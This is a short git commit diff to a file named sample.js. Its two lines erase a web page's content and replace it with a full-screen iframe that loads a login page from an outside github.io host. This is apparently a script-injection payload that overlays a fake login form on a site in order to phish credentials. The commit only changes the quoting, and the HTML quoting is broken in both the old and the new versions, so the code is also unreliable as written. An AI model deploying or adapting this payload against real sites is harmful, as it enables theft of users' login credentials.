31a1322f11c86bcca1b14fb57864dab2dd8b5854
jayeshmadnani25 <jayeshmadnani25@gmail.com>
2026-02-10 11:28:51 +0900

    Update sample.js

--- sample.js
+++ sample.js
@@ -1,2 +1,2 @@
-document.body.innerHTML=''
-document.body.innerHTML='<iframe src='https://jayeshmadnani25.github.io/bb/login.html' style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%;></iframe>'
+document.body.innerHTML=""
+document.body.innerHTML="<iframe src='https://jayeshmadnani25.github.io/bb/login.html' style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%;></iframe>"
